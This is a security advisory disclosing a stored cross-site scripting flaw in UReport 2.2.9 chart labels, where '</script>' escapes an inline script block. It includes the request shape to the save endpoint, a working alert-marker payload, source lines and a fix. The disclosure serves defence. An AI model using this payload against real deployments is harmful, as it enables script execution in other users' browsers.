# UReport chart-label script-element escape

## Summary

Dataset-controlled chart labels are embedded in JSON inside an inline script block without neutralizing the </script> sequence.

## Affected product

- Vendor/project: **youseries**
- Product: **UReport**
- Affected version: **2.2.9 (verified in SpringBlade 5.0.2)**
- Weakness: **CWE-79**
- CVSS 3.1: `CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N (5.4)`
- Verification: **STABLE — 3/3 consecutive fresh runs**

## Researcher

- **Zhong Guangyuan (钟广源), Fudan University**

## Attack prerequisites and impact

Authenticated report author; victim previews the stored chart report.

Verified flow: `dataset chart label -> CategoryDataset JSON -> ChartData serialization -> inline _buildChartDatas(...) script`

Successful exploitation permits attacker-controlled markup or script to execute in another user's browser in the affected application origin. The exact privilege and interaction requirements are reflected in the CVSS vector above.

## Reproduction

1. Create a chart report whose dataset returns a category label beginning with a closing script tag and an HTML marker.
2. Save the report and confirm its record persists.
3. Preview it and inspect the inline chart JSON where the HTML parser terminates the script element.

Sanitized request shape used during verification:

```http
POST <BASE_URL>/blade-report/ureport/designer/saveReportFile
blade-auth: bearer <JWT>

file=URLENCODE×3("blade-gt48261022r42c.ureport.xml")
content=URLENCODE×2(<ureport><dataset type="sql"><sql>
 select '&lt;/script&gt;&lt;img src=x onerror=self[`al`+`ert`](`gt48261022r42c`)&gt;' as cat, 1 as val
</sql>...</dataset><chart-value dataset-name="ds1" category-property="cat" value-property="val"/>...</ureport>)

GET <BASE_URL>/blade-report/ureport/preview?_u=blade-gt48261022r42c.ureport.xml
```

Authentication values, private host/IP values, internal identifiers, CSRF values, document keys and one-time tokens are redacted. Parameter names, affected endpoints and payload structure are retained.

## Fresh verification evidence

| Run | Marker | Observation | Result |
| --- | --- | --- | --- |
| 1 | `gt48261022r42a` | literal </script> + IMG | **PASS** |
| 2 | `gt48261022r42b` | literal </script> + IMG | **PASS** |
| 3 | `gt48261022r42c` | literal </script> + IMG | **PASS** |

```text
Saved run-3 chart data:
_buildChartDatas([{..."labels":["</script><img src=x onerror=self[`al`+`ert`](`gt48261022r42c`)>"]...}]);

The browser's HTML parser closes the script element before JavaScript parsing.
```

The evidence was generated from a researcher-controlled test deployment. Test records were cleaned after verification.

## Confirmed source and Sink

```text
CategoryDataset.java:113,232
sb.append("\"label\":\"" + series + "\",");
sb.append("\"" + obj + "\"");

HtmlPreviewServletAction.java:165-176
return mapper.writeValueAsString(chartData);

ureport-html/html-preview.html:120
_buildChartDatas($chartDatas);
```

Root cause: JSON that is valid for JavaScript is embedded directly in an HTML script element, but HTML-significant closing-tag text is not neutralized.

## Recommended remediation

Move chart data into an application/json element or external response and parse it, or escape the less-than character as \u003c before inline embedding.

## References

- Official source: https://github.com/youseries/ureport

## Evidence images

The three public evidence images show, in order:

1. The sanitized reproduction request, endpoint, parameter and payload structure.
2. The three consecutive successful verification runs and exact response/DOM/database excerpts.
3. The highlighted attacker-controlled source and unsafe rendering Sink.

The images are public-safe renderings produced from saved raw HTTP/DOM/database evidence; they are not represented as live browser screenshots.

### Sanitized reproduction

![CAN-08 sanitized reproduction](https://raw.githubusercontent.com/TERRENCE-REX/CVE/main/evidence/CAN-08/01-reproduction.png)

### Three-run success proof

![CAN-08 three-run success proof](https://raw.githubusercontent.com/TERRENCE-REX/CVE/main/evidence/CAN-08/02-success-proof.png)

### Source-to-Sink evidence

![CAN-08 source-to-Sink evidence](https://raw.githubusercontent.com/TERRENCE-REX/CVE/main/evidence/CAN-08/03-source-sink.png)
